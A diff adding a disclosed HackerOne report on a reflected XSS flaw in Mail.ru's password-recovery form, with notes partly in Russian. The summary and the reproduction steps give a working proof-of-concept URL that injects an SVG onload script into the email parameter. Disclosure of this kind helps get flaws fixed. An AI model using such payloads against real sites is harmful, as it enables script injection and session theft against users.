@@ -1,0 +1,43 @@
+ReportLink:https://hackerone.com/reports/360787
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/s_p_q_r
+ReportedTo:Mail.ru(mailru)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:31.07.2018 14:53:47
+
+Summary:
+Reflected XSS in account recovery request form
+При генерации формы восстановления пароля значение email подставляется туда как есть:
+
+https://account.mail.ru/recovery/support?email=%3Csvg%20onload=alert(document.domain)%3E
+
+Domain, site, application
+--
+https://account.mail.ru/recovery/support
+
+Testing environment
+--
+Firefox 60.0
+Chrome 66.0
+
+Steps to reproduce
+--
+Открыть https://account.mail.ru/recovery/support?email=%3Csvg%20onload=alert(document.domain)%3E
+
+Actual results
+--
+XSS
+
+Expected results, security impact description and recommendations
+--
+Фильтровать теги
+
+PoC, exploit code, screenshots, video, references, additional resources
+--
+{F303978}
+
+## Impact
+
+XSS
